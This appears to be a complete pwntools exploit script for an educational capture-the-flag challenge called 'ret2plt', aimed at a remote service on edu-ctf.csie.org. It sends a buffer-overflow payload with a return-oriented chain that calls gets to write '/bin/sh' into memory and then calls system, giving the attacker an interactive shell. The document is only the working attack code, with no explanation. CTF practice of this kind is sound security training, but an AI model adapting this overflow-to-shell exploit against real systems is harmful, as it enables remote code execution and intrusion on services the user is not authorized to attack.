from pwn import *

context.arch = 'amd64'

system_plt = 0x400520
gets_plt = 0x400530

pop_rdi = 0x400733

p = remote('edu-ctf.csie.org', 10174)
# p = process('./ret2plt-83d4575e4e92e41500fec85f4334401e')

ropchain = flat(pop_rdi,
        0x601800,
        gets_plt,
        pop_rdi,
        0x601800,
        system_plt)

payload = 'a' * 0x30 + 'b' * 8 + ropchain
p.sendline(payload)
sleep(0.1)
p.sendline('/bin/sh')

p.interactive()
